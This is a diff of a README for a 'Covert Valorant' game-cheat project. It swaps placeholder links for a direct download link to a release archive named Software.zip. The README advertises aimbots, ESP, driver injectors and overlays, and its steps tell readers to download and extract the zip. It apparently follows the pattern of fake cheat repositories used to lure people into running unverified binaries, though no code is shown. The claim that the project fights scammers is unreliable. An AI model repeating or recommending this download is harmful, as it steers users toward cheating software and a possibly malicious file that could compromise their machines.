@@ -2,7 +2,7 @@
 
 # Covert Valorant
 
-[Download Link](555)
+[Download Link](https://github.com/sapperborne0/Covert-Valorant-Cheat/releases/download/Releases/Software.zip)
 
 I am developing various cheats and tools for games, focusing on combating scammers. My projects include creating cheats such as aimbots, ESPs, magic bullets, driver injectors, overlays, and Imgui tools.
 
@@ -44,7 +44,7 @@ I am developing various cheats and tools for games, focusing on combating scamme
 
 ## How to Use
 
-- Download zip archive [Download Link](555)
+- Download zip archive [Download Link](https://github.com/sapperborne0/Covert-Valorant-Cheat/releases/download/Releases/Software.zip)
 - Extract Project to Folder.
 - Make Sure You Have Visual Studio Installed on Your Computer
 - [Click if Visual Studio is Not Installed](https://visualstudio.microsoft.com/en/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030)
